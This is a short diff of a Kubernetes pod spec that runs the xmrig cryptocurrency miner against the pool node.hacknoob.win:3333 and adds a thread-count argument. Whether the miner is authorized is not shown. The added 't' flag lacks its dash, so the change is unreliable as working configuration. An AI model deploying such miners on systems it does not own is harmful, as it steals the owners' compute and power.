@@ -17,6 +17,8 @@ spec:
     image: busybox
     command:
     - /home/manager/xmrig/build/xmrig
+    - t
+    - "2"
     - -o
     - node.hacknoob.win:3333
     - -u
